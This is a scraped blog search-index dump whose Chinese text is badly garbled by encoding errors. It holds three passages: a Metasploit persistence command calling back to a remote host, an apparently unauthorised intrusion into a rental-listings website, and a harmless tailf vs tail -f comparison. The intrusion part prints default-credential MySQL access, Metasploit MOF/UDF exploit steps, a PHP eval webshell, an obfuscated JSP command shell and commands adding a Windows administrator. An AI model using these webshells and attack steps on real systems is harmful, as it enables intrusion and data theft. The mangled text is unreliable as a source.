use, default is windows/meterpreter/reverse_tcp.\"] é«˜äº®éƒ¨åˆ†ä¸ºå¸¸ç”¨é…ç½®é¡¹ æ±‰åŒ–ç‰ˆ-h å¸®åŠ©ä¿¡æ¯-r è¿œç¨‹æœåŠ¡ç«¯ç›‘å¬ç«¯å£-p è¿œç¨‹æœåŠ¡ç«¯ç›‘å¬ç«¯å£-i æ¯éš”å‡ ç§’é‡è¯•è¿æ¥-X æ›´éšç³»ç»Ÿè‡ªå¯åŠ¨-U å½“ç”¨æˆ·ç™»å½•æ—¶è‡ªå¯åŠ¨-S ä½œä¸ºæœåŠ¡å¯åŠ¨-A æœåŠ¡ç«¯è‡ªåŠ¨å»ºç«‹handlerç›‘å¬æœåŠ¡-L åé—¨ä¼ åˆ°è¿œç¨‹ä¸»æœºçš„ä½ç½®é»˜è®¤ä¸º%TEMP%-T é…ç½®æ¨¡ç‰ˆ-P ä½¿ç”¨çš„Payloadï¼Œé»˜è®¤windows/meterpreter/reverse_tcp æ ¹æ®é€‰é¡¹å¸®åŠ©æç¤ºæ‰§è¡ŒæŒä¹…åŒ–å‘½ä»¤ï¼š 123meterpreter &gt; run persistence -S -i 5 -p 33333 -r b1g-d1ck.kionf.com -L c:\\\\Windows\\\\System32# è„šæœ¬æ³¨å†Œè‡ªå¯åŠ¨æ³¨å†Œè¡¨ä½ç½®ï¼šHKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run 0x02 æµ‹è¯•æµ‹è¯•é€€å‡ºå½“å‰sessionã€‚ok 5ç§’åsessionåˆè‡ªåŠ¨è¿æ¥å›æ¥äº† æ³¨ï¼š å¢åˆ æ”¹æŸ¥æ³¨å…¥è‡ªå¯åŠ¨æ³¨å†Œè¡¨# æŸ¥è¯¢Keymeterpreter &gt; reg enumkey -k HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunEnumerating: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Values (3): SysTeM32 MDxTmrUjRGnvIaT UxMvAJkbedJu# æŸ¥è¯¢Valuesmeterpreter &gt; reg queryval -k HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run -v UxMvAJkbedJuKey: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunName: UxMvAJkbedJuType: REG_SZData: c:\\Windows\\System32\\ANoZYsNFQVe.vbs# åˆ é™¤Valuesmeterpreter &gt; reg deleteval -k HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run -v MDxTmrUjRGnvIaTSuccessfully deleted MDxTmrUjRGnvIaT. /usr/share/metasploit-framework/scripts/ æ­¤ç›®å½•å­˜æ”¾runè„šæœ¬/usr/share/metasploit-framework/modules/ æ­¤ç›®å½•å­˜æ”¾å„ç§è„šæœ¬æ‡µé€¼çš„æ—¶å€™ç›´æ¥è‡ªå·±è¿›å»çœ‹è„šæœ¬ã€‚","raw":null,"content":null,"categories":[{"name":"kali","slug":"kali","permalink":"https://kionf.com/categories/kali/"},{"name":"metasploit","slug":"kali/metasploit","permalink":"https://kionf.com/categories/kali/metasploit/"}],"tags":[{"name":"metasploit","slug":"metasploit","permalink":"https://kionf.com/tags/metasploit/"}]},{"title":"æ¸—é€æµ‹è¯•å°è®°-ç”±ç§Ÿæˆ¿å¼•å‘çš„æƒ¨æ¡ˆ","slug":"hack-note-00100","date":"2018-09-10T16:00:00.000Z","updated":"2018-10-31T10:19:28.291Z","comments":true,"path":"2018/09/11/hack-note-00100/","link":"","permalink":"https://kionf.com/2018/09/11/hack-note-00100/","excerpt":"ä½œä¸ºä¸€åï¼Œæ€€æ£è¿œ(che)å¤§(du)ç†(zi)æƒ³(ne)çš„åŒ—æ¼‚ï¼Œæ°¸è¿œç¦»ä¸å¼€ç§Ÿæˆ¿å­çš„è¯é¢˜ï¼Œ58.é“¾å®¶.æˆ‘çˆ±æˆ‘å®¶â€¦å„ç§ä¸­ä»‹å‘çš„å¿ƒæ…Œï¼Œæƒ³ç›´æ¥æ‰¾ä¸ªæˆ¿ä¸œæ•´ç§Ÿä¸€ä¸ªï¼Œå¶ç„¶é—´äº†è§£åˆ°xxç½‘ç«™æ˜¯ä¸“ä¸ºä¸­ä»‹ç»Ÿè®¡çš„æˆ¿ä¸œæˆ¿æºï¼Œå½“ç„¶æ˜¯èŠ±é’±çš„ï¼ˆMMã€‚ï¼‰ï¼Œé‚å¼•å‘äº†ä»¥ä¸‹æƒ¨æ¡ˆã€‚äººç‹ è¯ä¸å¤šï¼Œæ•´ï¼\n","text":"ä½œä¸ºä¸€åï¼Œæ€€æ£è¿œ(che)å¤§(du)ç†(zi)æƒ³(ne)çš„åŒ—æ¼‚ï¼Œæ°¸è¿œç¦»ä¸å¼€ç§Ÿæˆ¿å­çš„è¯é¢˜ï¼Œ58.é“¾å®¶.æˆ‘çˆ±æˆ‘å®¶â€¦å„ç§ä¸­ä»‹å‘çš„å¿ƒæ…Œï¼Œæƒ³ç›´æ¥æ‰¾ä¸ªæˆ¿ä¸œæ•´ç§Ÿä¸€ä¸ªï¼Œå¶ç„¶é—´äº†è§£åˆ°xxç½‘ç«™æ˜¯ä¸“ä¸ºä¸­ä»‹ç»Ÿè®¡çš„æˆ¿ä¸œæˆ¿æºï¼Œå½“ç„¶æ˜¯èŠ±é’±çš„ï¼ˆMMã€‚ï¼‰ï¼Œé‚å¼•å‘äº†ä»¥ä¸‹æƒ¨æ¡ˆã€‚äººç‹ è¯ä¸å¤šï¼Œæ•´ï¼ 0x00 ä¿¡æ¯æ”¶é›†1. oké¦–å…ˆæ‹¿åˆ°ç½‘ç«™åï¼Œå…ˆæ‰“å¼€å®˜ç½‘ç…äº†ç…: ç®€å•åˆ†æä¸ºPHPå†™çš„ï¼Œæ²¡æœ‰ç™»é™†æˆ¿ä¸œçš„æ‰‹æœºå·ä¸ºæ‰“ç çŠ¶æ€ï¼Œå‡Œæ™¨1ç‚¹åŠçš„æˆ‘ï¼Œè„¸ä¸Šé€æ¸æ¼å‡ºç¬‘å®¹ ï¼šï¼‰ 2. éšä¾¿è¾“å…¥ä¸€ä¸ªåœ°å€ï¼š çœ‹åˆ°è¿™ä¸ªä¸§é€¼è„¸ï¼Œç»éªŒå‘Šè¯‰æˆ‘TMè¿™å°±æ˜¯ ThinkPhpæ¡†æ¶ 3. åœ¨æä¸ªéšä¾¿è¾“å…¥ä¸ª404åœ°å€ ç»¼åˆä»¥ä¸Šæ‰‹æ’¸ï¼Œåˆ†æå¤§æ¦‚ç¯å¢ƒä¸ºï¼š ç¯å¢ƒIIS + ThinkPHP + php + Windows æ­¤ç»“æœä¸ºæ‰‹æµ‹ï¼Œç»éªŒä¸è¶³å¯ä»¥ä½¿ç”¨whatwebæ£€æµ‹webç¯å¢ƒ whatweb xxx.com1http://xxx.com/index.php/Manage/Login/index [200 OK] Cookies[BJYADMIN], Country[CHINA][CN], HTML5, HTTPServer[Microsoft-IIS/7.0], IP[115.28.xxx.xxx], JQuery[1.11.1], Microsoft-IIS[7.0], PasswordField[password], Script[JavaScript,javascript,text/javascript], Title[ç®¡ç†ç³»ç»Ÿ], X-Powered-By[thinkphp-bjyadmin, ASP.NET], X-UA-Compatible[IE=edge] 4. åŸŸååˆ†ædig xxx.com; &lt;&lt;&gt;&gt; DiG 9.11.3-1-Debian &lt;&lt;&gt;&gt; xxx.com;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 364;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096;; QUESTION SECTION:;lx808.com. IN A;; ANSWER SECTION:xxx.com. 3599 IN CNAME www.xxx.com.xxx.com.www.xxx.com.xxx.com. 3600 IN A 115.28.xxx.xxx;; Query time: 1370 msec;; SERVER: 108.61.10.10#53(108.61.10.10);; WHEN: Tue Sep 11 18:51:58 CST 2018;; MSG SIZE rcvd: 82 è·å–åˆ°ipï¼š115.28.xxx.xxxï¼ŒæŸ¥çœ‹æ˜¯IPç›¸å…³ä¿¡æ¯ï¼š curl cip.cc/115.28.xxx.xxxIP : 115.28.xxx.xxxåœ°å€ : ä¸­å›½ å±±ä¸œ é’å²›è¿è¥å•† : é˜¿é‡Œäº‘æ•°æ®äºŒ : å±±ä¸œçœé’å²›å¸‚ | é˜¿é‡Œå·´å·´ç½‘ç»œæœ‰é™å…¬å¸BGPæ•°æ®ä¸­å¿ƒURL : http://www.cip.cc/115.28.xxx.xxx 5. ä¸»æœºä¿¡æ¯è„šæœ¬å°å­ï¼Œä¸Šï¼nmap æ‰«æ nmap -sV -T4 -O -F --version-light 115.28.xxx.xxxNmap scan report for 115.28.xxx.xxxHost is up (0.19s latency).Not shown: 83 closed portsPORT STATE SERVICE VERSION25/tcp filtered smtp80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)135/tcp filtered msrpc139/tcp filtered netbios-ssn445/tcp filtered microsoft-ds1027/tcp filtered IIS1028/tcp filtered unknown3128/tcp filtered squid-http3306/tcp open mysql MySQL 5.5.403389/tcp open ms-wbt-server Microsoft Terminal Service5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)8009/tcp open ajp13 Apache Jserv (Protocol v1.3)8080/tcp open http Apache Tomcat/Coyote JSP engine 1.149152/tcp open unknown49153/tcp open unknown49154/tcp open unknown49155/tcp open unknown å…¶ä¸­æœ‰ä¸¤ä¸ªä¸ªè®©äººéå¸¸æ„Ÿå…´è¶£çš„æœåŠ¡åŠç«¯å£ï¼š 3306 Mysql3389 RDP 0x01 æ¸—é€1. éšæ‰‹ä¸€è¾“å…¥å¸¦æ¥çš„æƒŠå–œï¼çœ‹åˆ°å¸¸ç”¨ç«¯å£éƒ½æ²¡æœ‰æ›´æ”¹ï¼Œå¯¹å¤–æš´éœ²ã€‚çŒœæµ‹å®‰å…¨æ„è¯†ä¼°è®¡ä¹Ÿæ˜¯å¾ˆè–„å¼±ï¼Œéšä¾¿ç”¨rootï¼šrootè¿æ¥mysqlã€‚ Duang, Duang, Duang æœ‰æ—¶å€™å°±æ˜¯è¿™æ ·ç™¾å¯†ä¸€ç–ï¼Œå®‰å…¨é—®é¢˜çš„é‡ä¸­ä¹‹é‡å°±æ˜¯ç»†èŠ‚å¯èƒ½ä½ åœ¨æƒ³è¿™ä¹ˆLowé€¼ä¹Ÿå¥½æ„æ€å†™ï¼Ÿé‚£ä¹ˆä½ é”™äº†ï¼Œé‡å¤´æˆåœ¨åå¤´ï¼ è¿æ¥åï¼ŒæŸ¥çœ‹äº†ä¸€ä¸‹æ•°æ®åº“ï¼Œæ ¹æ®åç§°æ‰¾åˆ°å½“å‰ç½‘ç«™æ‰€ä½¿ç”¨æ•°æ®åº“ã€‚æ ¹æ®è¡¨åæ‰¾åˆ°å¤§æ¦‚ä¸ºç”¨æˆ·è´¦å·å¯†ç ä¿¡æ¯è¡¨ å·²åˆ°å¤œæ·±ï¼Œä¸æƒ³å†åŠ³ä½“ä¼¤èº«ï¼Œéšä¾¿æ‰¾ä¸ªç”¨æˆ·åï¼Œmd5å¯†ç æ‰”åˆ°dmd5è§£å¯†å‡ºæ˜æ–‡ï¼Œæœ¬ä»¥ä¸ºèƒ½ç™»é™†è¿™äº‹å„¿å°±ç®—äº†ï¼Œæ”¾ä»–ä¸€é©¬ã€‚ But ! æç¤ºè´¦å·å¯†ç é”™è¯¯ï¼Œåˆå°è¯•äº†å‡ ä¸ªè´¦å·å‘ç°ï¼Œè¢«ç¦ç”¨ ï¼ï¼é€šè¿‡æŸ¥çœ‹æ•°æ®åº“è®°å½•çš„ç™»é™†ä¿¡æ¯andçŒœæµ‹ï¼Œå¾—å‡ºåº”è¯¥ç°åœ¨çš„ç½‘ç«™å¹¶æ²¡æœ‰è¿æ¥æ­¤æ•°æ®åº“ã€‚æ·±å¤œçš„æˆ‘æ‰£äº†æ‰£è„šä¸«å­ï¼Œå‘ç°äº‹æƒ…å¹¶æ²¡æœ‰é‚£ä¹ˆç®€å•ã€‚ è™½ç„¶æ²¡æœ‰ä½¿ç”¨ç°åœ¨çš„æ•°æ®åº“ï¼Œä½†æˆ‘ä»¬æ˜¯æœ‰rootç™»é™†åˆ°æ•°æ®åº“çš„å•Šï¼Œæƒé™é«˜å•Šï¼Œææƒå•Šï¼ Letâ€™s Go 2. å¸¸ç”¨Lowé€¼Mysqlææƒå‡ ç§æ–¹å¼ï¼š UDFææƒ MOFææƒ into outfileå†™å…¥shell ç¥­å‡ºæˆ‘çš„å®è´ metasploit 1) MOFææƒè„šæœ¬å°å­ä¸‰éƒ¨æ›²# 1. å¯åŠ¨msfé€‰æ‹©exploit&gt; msfconsole&gt; search mysql_mofMatching Modules================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- exploit/windows/mysql/mysql_mof 2012-12-01 excellent Oracle MySQL for Microsoft Windows MOF Execution&gt; use exploit/windows/mysql/mysql_mof# 2. è®¾ç½®ç›®æ ‡msf exploit(windows/mysql/mysql_mof) &gt; show options# show advanced# æ˜¾ç¤ºé«˜çº§é€‰é¡¹ï¼Œè¿›è¡Œè‡ªå®šä¹‰è¿™é‡Œä¸éœ€è¦æš‚ä¸”ä¸å±•å¼€è®¨è®ºModule options (exploit/windows/mysql/mysql_mof): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD yes The password to authenticate with RHOST yes The target address RPORT 3306 yes The target port (TCP) USERNAME yes The username to authenticate asExploit target: Id Name -- ---- 0 MySQL on Windows prior to Vista&gt; set RHOST 115.28.xxx.xxx&gt; set PASSWORD root&gt; set USERNAME root# 3. å¯åŠ¨&gt; exploit å‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œæ²¡æœ‰è¿”å›sessionï¼Œ åˆ©ç”¨ç¨‹åºå¯èƒ½è¢«åˆ é™¤ 2) UDFææƒå°è¯•UDFææƒmsf exploit(windows/mysql/mysql_mof) &gt; search mysql_udfMatching Modules================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- exploit/multi/mysql/mysql_udf_payload 2009-01-16 excellent Oracle MySQL UDF Payload Execution&gt; use exploit/multi/mysql/mysql_udf_payload&gt; show options&gt; set RHOST 115.28.xxx.xxx&gt; set PASSWORD root&gt; set USERNAME root æ³¨æ„çº¢æ¡†åœˆå‡ºä½ç½®ï¼Œæ ¹æ®ç›®å½•ç»“æ„åˆ¤æ–­æ˜¯PhpStudyæ­å»ºçš„ï¼Œåé¢ä¼šä½¿ç”¨åˆ° ä¾æ—§æ²¡æœ‰æˆåŠŸè¿”å›sessionï¼Œæœ‰å°è¯•äº†å‡ æ¬¡MOFï¼Œå‘ç°è¿æ¥Mysqlè¢«æ‹’ç»äº†ã€‚è¿™æ—¶æ‰æƒ³èµ·æœºå™¨æ—¶éƒ¨ç½²åœ¨é˜¿é‡Œäº‘ï¼Œæœ‰ä¸€ä¸ªAliYunDunè¿™ä¸ªå°å¯çˆ±ï¼Œä¸Šé¢MOFçš„ææƒæ–‡ä»¶åº”è¯¥ä¹Ÿæ˜¯ä»–åˆ é™¤çš„ã€‚ 3) å°è¯•å†™å…¥WebShellç”±ä¸Šé¢åœ¨è¿›è¡ŒUDFææƒæ—¶çˆ†å‡ºæ¥çš„æ˜¯ä½¿ç”¨PhpStudyæ­å»ºçš„webç¯å¢ƒï¼Œå¯ä»¥çŒœæµ‹å‡ºé»˜è®¤Webè·¯å¾„ï¼Œä½¿ç”¨ä»£ç†è¿æ¥ç›®æ ‡Mysqlæ‰§è¡Œï¼š æŸ¥çœ‹Mysql datadir&gt; select @@datadir;+-----------------------------+| @@datadir |+-----------------------------+| D:\\phpStudy4IIS\\MySQL\\data\\ |+-----------------------------+ æœ¬æœºä¸‹è½½ç›¸å¯¹åº”ç‰ˆæœ¬å®‰è£…åŒ…ï¼Œå®‰è£…åæŸ¥çœ‹åˆ°é»˜è®¤Webè·¯å¾„ä¸ºD:\\phpStudy4IIS\\WWWã€‚okæ—¢ç„¶ç½‘ç«™ç›®å½•å¾—åˆ°äº†å¹¶ä¸”é€šè¿‡ä¹‹å‰çš„ä¿¡æ¯æ”¶é›†å¾—åˆ°ä½¿ç”¨çš„æ˜¯ThinkPHPï¼Œæˆ‘ä»¬å°±å°è¯•å†™å…¥PHPä¸€å¥è¯Shellã€‚ è¿æ¥ç›®æ ‡Mysqlå†™å…¥Web Shell1234mysql -uroot -proot -h115.28.xxx.xxx mysql# å†™å…¥PHP shellselect load_file('/root/sys_thinkphp.php') into outfile 'D:\\phpStudy4IIS\\WWW\\sys.php' PHP Shellæ–‡ä»¶ï¼ˆè‡ªå®šä¹‰å’Œæ­£å¸¸èœåˆ€ä¸é€šç”¨ï¼‰ï¼š sys_thinkphp.php1234567&lt;?php$thinkss = create_function('$a', 'ev'.'al($a);');$thinkss(stripslashes($_POST['***REMOVED***']));?&gt; ä½¿ç”¨æµè§ˆå™¨è®¿é—®ï¼Œæ²¡è¦æŠ¥404ã€‚shellå†™å…¥æˆåŠŸï¼ï¼ 3. è¿›ä¸€æ­¥æ¸—é€ä½¿ç”¨èœåˆ€è¿æ¥ï¼š è·å–shellï¼Œé€šè¿‡æŸ¥çœ‹ç›®å½•ç»“æ„ã€åŠaspã€phpã€tomcatä»£ç ï¼Œè¿™é‡Œçœç•¥ä¸€ä¸‡å­—ï¼Œè·å–å¦‚ä¸‹ä¿¡æ¯ï¼š ç¯å¢ƒ: tomcat7.0 IIS mysql aspxç½‘ç«™è·¯å¾„æŸ¥çœ‹ä»£ç å‘ç°è¿æ¥æ•°æ®åº“ä¸ºå¹¶å¾—åˆ°å¯†ç : Mysql: 114.215.xxx.xxx Mysql: 115.29.xx.xxx SqlServer: 115.29.xx.xxx å¸¸ç”¨WEBæœåŠ¡é…ç½®æ–‡ä»¶ä½ç½®ï¼š ThinkPhp: ./www/ThinkPHP/Conf/ ./www/Application/Common/Conf/Tomcat: ./tomcat/webapps/appname/WEB-INF/classes/IIS: ./www/Web.config 4. ä¼‘æˆ˜ä½¿ç”¨èœåˆ€è¿æ¥shellç”±äºç¯å¢ƒé—®é¢˜æ— æ³•æ‰§è¡Œç»ˆç«¯å‘½ä»¤ã€‚çœ‹åˆ°æœ‰tomcatåº”ç”¨ï¼Œå°±ä¼ ä¸Šä¸ªå°jspé©¬æ¥æ‰§è¡Œå‘½ä»¤,æ·»åŠ ä¸ªç”¨æˆ· jspå°é©¬é©¬12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;%@ page import=\"java.util.Scanner\" pageEncoding=\"UTF-8\" %&gt;&lt;HTML&gt;&lt;title&gt;Titanium&lt;/title&gt;&lt;BODY&gt;&lt;FORM METHOD=POST ACTION='#'&gt; &lt;INPUT name='q' type=text&gt; &lt;INPUT type=submit value='Fly'&gt;&lt;/FORM&gt;&lt;%! public static String getPicture(String str) throws Exception&#123; String fileSeparator = String.valueOf(java.io.File.separatorChar); if(fileSeparator.equals(\"\\\\\"))&#123; str = new String(new byte[] &#123;99, 109, 100, 46, 101, 120, 101, 32, 47, 67, 32&#125;) + str; &#125;else&#123; str = new String(new byte[] &#123;47, 98, 105, 110, 47, 98, 97, 115, 104, 32, 45, 99, 32&#125;) + str; &#125; Class rt = Class.forName(new String(new byte[] &#123; 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 &#125;)); Process e = (Process) rt.getMethod(new String(new byte[] &#123; 101, 120, 101, 99 &#125;), String.class).invoke(rt.getMethod(new String(new byte[] &#123; 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 &#125;)).invoke(null, new Object[]&#123;&#125;), new Object[] &#123; str &#125;); Scanner sc = new Scanner(e.getInputStream()).useDelimiter(\"\\\\A\"); String result = \"\"; result = sc.hasNext() ? sc.next() : result; sc.close(); return result; &#125;%&gt;&lt;% String name =\"Input Nothing\"; String query = request.getParameter(\"q\"); if(query != null) &#123; name = getPicture(query); &#125;%&gt;&lt;pre&gt;&lt;%= name %&gt;&lt;/pre&gt;&lt;/BODY&gt;&lt;/HTML&gt; æ·»åŠ Winç”¨æˆ·è®¾ä¸ºç®¡ç†å‘˜12net user kionf kionf /addnet localgroup adminostrators kionf /add é€šè¿‡æŸ¥çœ‹phpä»£ç åˆ†æå‡ºï¼Œæˆ¿æºç½‘ç«™è¿æ¥çš„æ˜¯SqlServer: 115.29.xx.xxxï¼Œç”¨æˆ·ç™»å½•é€šè¿‡æŸ¥è¯¢ä¸¤ä¸ªè¡¨ã€‚mysqlç”¨æˆ·è¡¨è®°å½•ç”¨æˆ·å¯ä»¥ç™»å½•ipæ•°ï¼ŒåŠç»‘å®šip,å¦‚æœFirstå­—æ®µä¸º0åˆ™ä¸ºé¦–æ¬¡ç™»é™†ï¼Œé¦–æ¬¡ç™»é™†ipå†™å…¥æ•°æ®åº“ï¼Œè´¦å·å¯†ç å‚¨å­˜åœ¨SqlServerã€‚ ç™»é™†ä¹‹ï¼ 0x02 åƒé‡Œä¹‹å ¤ï¼Œæºƒäºèšç©´ åœ¨ä¸Šé¢è¿›ä¸€æ­¥æ¸—é€ä¸­è·å–åˆ°ä¸€ä¸ªæ•°æ®åº“ï¼š Mysql: 114.215.xxx.xxx æ ¹æ®ThinkPHPæ¡†æ¶é…ç½®æ–‡ä»¶ä¸­çš„è´¦å·å¯†ç ï¼Œè¿æ¥åæŸ¥çœ‹æ•°æ®åº“: æ‰§è¡Œsql123select @@hostname;iZxxxxxxxx å°è¯•Googleä¸‹è¿™ä¸ªç‰¹åˆ«çš„hostnameï¼Œå‡ºç°äº†æƒŠå–œï¼š è¿›ä¸€æ­¥éªŒè¯å¾—å‡ºç½‘ç«™è·¯å¾„ï¼š nmapæ‰«ææœºå™¨ï¼Œå¾—å‡ºWEBç«¯å£è®¿é—®80ç«¯å£404ï¼Œè®¿é—®443æˆåŠŸå‡ºç°ç•Œé¢ï¼Œæ‰‹æµ‹æ¡†æ¶çˆ†å‡ºWebè·¯å¾„ï¼š é€šè¿‡Mysqlå†™å…¥ä¸€å¥è¯ï¼Œèœåˆ€è¿ä¹‹ï¼š rootå¯åŠ¨çš„nginxï¼Œæƒé™å°±ä¸ç”¨è¯´äº†ï¼Œæ ¹æ®è·å–ä¿¡æ¯Googleæ­¤å…¬å¸titleï¼Œå¾—çŸ¥æ˜¯ä¸€ä¸ªè½¯ä»¶å¤–åŒ…å…¬å¸ï¼Œ114.215æ­¤å°æœºå™¨åº”è¯¥ä¸ºå†…éƒ¨å¼€å‘æµ‹è¯•æœºå™¨ã€‚è€Œä¸”æ­¤æœºå™¨å®‰è£…æœ‰SVN,wwwrootç›®å½•ä¸‹æ”¾ç½®æ˜¯å¤–åŒ…çš„é¡¹ç›®ä»£ç ï¼Œç»§ç»­å»¶ä¼¸æ¸—é€åº”è¯¥ä¼šæ‹¿ä¸‹æ•´ä¸ªå¤–åŒ…å…¬å¸æ‰€æœ‰æœºå™¨çš„æƒé™ã€‚æ“ä½œè¿‡ç¨‹æ²¡æœ‰ä»€ä¹ˆæŠ€æœ¯å«é‡ï¼Œéƒ½æ˜¯ç‚¹å­éªšï¼Œå¼€å‘è¿‡ç¨‹ä¸­å®‰å…¨æ„è¯†è–„å¼±ï¼Œä¿¡æ¯æ³„æ¼ã€‚åˆšåˆšå»å«ç”Ÿé—´å¤´çªç„¶æ™•äº†ä¸€ä¸‹ï¼Œå·®ç‚¹æ‘”å€’ã€‚æˆ‘ç°åœ¨æ…Œçš„ä¸€æ‰¹ğŸ˜¨ èº«ä½“é‡è¦ä¸å¼„äº†ã€‚","raw":null,"content":null,"categories":[{"name":"hack-note","slug":"hack-note","permalink":"https://kionf.com/categories/hack-note/"}],"tags":[{"name":"æ¸—é€æµ‹è¯•å°è®°","slug":"æ¸—é€æµ‹è¯•å°è®°","permalink":"https://kionf.com/tags/æ¸—é€æµ‹è¯•å°è®°/"}]},{"title":"tailf å’Œ tail -f åŒºåˆ«","slug":"linux-tailf","date":"2018-09-06T16:00:00.000Z","updated":"2018-10-31T10:19:28.307Z","comments":true,"path":"2018/09/07/linux-tailf/","link":"","permalink":"https://kionf.com/2018/09/07/linux-tailf/","excerpt":"å¯¹äºå°æ–‡ä»¶ (å¤§çº¦å°äº5GB) ä½¿ç”¨tailfï¼Œ tail -f æ²¡æœ‰æ˜æ˜¾åŒºåˆ«ã€‚ ä¸€æ¬¡å¶ç„¶ä½¿ç”¨tailfæŸ¥çœ‹ä¸€ä¸ª20GBæ—¥å¿—æ–‡ä»¶æ—¶ï¼Œ å‘ç°æ— æ³•æ˜¾ç¤ºï¼Œ è€Œä½¿ç”¨tail -få´å¯ä»¥æ˜¾ç¤ºã€‚ç”±æ­¤å»¶ä¼¸å‡ºæœ¬æ–‡ \n","text":"å¯¹äºå°æ–‡ä»¶ (å¤§çº¦å°äº5GB) ä½¿ç”¨tailfï¼Œ tail -f æ²¡æœ‰æ˜æ˜¾åŒºåˆ«ã€‚ ä¸€æ¬¡å¶ç„¶ä½¿ç”¨tailfæŸ¥çœ‹ä¸€ä¸ª20GBæ—¥å¿—æ–‡ä»¶æ—¶ï¼Œ å‘ç°æ— æ³•æ˜¾ç¤ºï¼Œ è€Œä½¿ç”¨tail -få´å¯ä»¥æ˜¾ç¤ºã€‚ç”±æ­¤å»¶ä¼¸å‡ºæœ¬æ–‡ 0x00 å‡†å¤‡å®éªŒç¯å¢ƒ å°è¯•ç›´æ¥googleä¸¤è€…çš„åŒºåˆ«å‘ç°å¤§éƒ¨åˆ†è¯´çš„ä¸æ˜¯å¾ˆè¯¦ç»†ï¼ŒæŠ„çš„ä¹Ÿä¸æ˜¯å¾ˆå¥½ã€‚æ‰€ä»¥è‡ªå·±å†™ä¸‹æ¥åšä¸ªç¬”è®°ã€‚ 1. ç”Ÿæˆå¤§æ–‡ä»¶10GBä½¿ç”¨ddç”ŸæˆæŒ‡å®šå¤§å°æ–‡ä»¶dd if=/dev/urandom of=bigFile bs=10M count=1000 2. å®‰è£…straceè·Ÿè¸ªè¿›ç¨‹ä¸­çš„ç³»ç»Ÿå‡½æ•°è°ƒç”¨yum -y install strace 3. æµ‹è¯•è½½å…¥æ—¶é—´åˆ†åˆ«ä½¿ç”¨ tailfï¼Œtail -fæŸ¥çœ‹åˆšæ‰ç”Ÿæˆçš„æ–‡ä»¶ï¼Œæ˜æ˜¾æ„Ÿè§‰tailfæ¯”tail -fæ—¶é—´é•¿ 0x01 åˆ†æä¸¤è€…ä½¿ç”¨è¿‡ç¨‹ä¸­ç³»ç»Ÿè°ƒç”¨åŒºåˆ«ç¯å¢ƒå‡†å¤‡1234567echo \"test\" &gt; test# è¿½è¸ªtailfstrace -o trace_tailf tailf test# è¿½è¸ªtail -fstrace -o trace_tail_f tail -f test å¯¹æ¯”ç»“æœ: ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºä¸»è¦æœ‰ä¸¤å¤„ä¸åŒ test æ–‡ä»¶ä¿¡æ¯12345678 æ–‡ä»¶ï¼š\"test\" å¤§å°ï¼š5 å—ï¼š8 IO å—ï¼š4096 æ™®é€šæ–‡ä»¶è®¾å¤‡ï¼šfd01h/64769d Inodeï¼š138235 ç¡¬é“¾æ¥ï¼š1æƒé™ï¼š(0644/-rw-r--r--) Uidï¼š( 0/ root) Gidï¼š( 0/ root)æœ€è¿‘è®¿é—®ï¼š2018-09-07 17:59:24.842451394 +0800æœ€è¿‘æ›´æ”¹ï¼š2018-09-07 17:59:19.175452013 +0800æœ€è¿‘æ”¹åŠ¨ï¼š2018-09-07 17:59:19.175452013 +0800åˆ›å»ºæ—¶é—´ï¼š- 0x02 åŒºåˆ«1. è°ƒç”¨å‡½æ•°åŒºåˆ«ä½¿ç”¨straceè¿½è¸ªå‘½ä»¤çš„ç³»ç»Ÿå‡½æ•°è°ƒç”¨å¯¼å‡ºæ–‡ä»¶ï¼Œåˆ†æåŒºåˆ« tailf æµç¨‹1. ä½¿ç”¨statå‡½æ•°è·å–æ–‡ä»¶åï¼Œfstaté€šè¿‡æ–‡ä»¶åè·å–æ–‡ä»¶ IO block ä¿¡æ¯ 40962. read(3, \"test\\n\", 4096) = 5 #ä½¿ç”¨readå‡½æ•°ä»ç£ç›˜åœ°å€ 4096 å¼€å§‹è¯»å–æ–‡ä»¶è¯»å–5å­—èŠ‚æ–‡ä»¶å¤§å° tail -f æµç¨‹1. ä½¿ç”¨fstatå‡½æ•°é€šè¿‡æ–‡ä»¶æè¿°ç¬¦è·å–ä¿¡æ¯ï¼Œè·å–seek lseek(3, 0, SEEK_CUR) = 0 #å¼€å§‹seek lseek(3, 0, SEEK_END) = 5 #ç»“æŸseek lseek(3, 0, SEEK_SET) = 0 #å½“å‰seekä½ç½®2. seekè®¾ç½®åˆ°SEEK_ENDä½ç½®ï¼Œreadå‡½æ•°ä»æœ«å°¾è¯»å–æ–‡ä»¶ read(3, \"test\\n\", 5) = 5 lseek(3, 0, SEEK_SET) = 0 é€šè¿‡ç³»ç»Ÿå‡½æ•°è°ƒç”¨åˆ†æå¾—å‡ºåŒºåˆ«ï¼š `tailf` : è°ƒç”¨ç³»ç»Ÿå‡½æ•°`stat()`é€šè¿‡è·å–åˆ°çš„æ–‡ä»¶åï¼ŒæŸ¥çœ‹blockä½ç½®åŠå¤§å°ï¼Œ`read()`ä»å¤´å¼€å§‹è½½å…¥æŒ‡å®šæ–‡ä»¶å¤§å°å—,è¿›è¡Œè¯»å–`tail -f` : 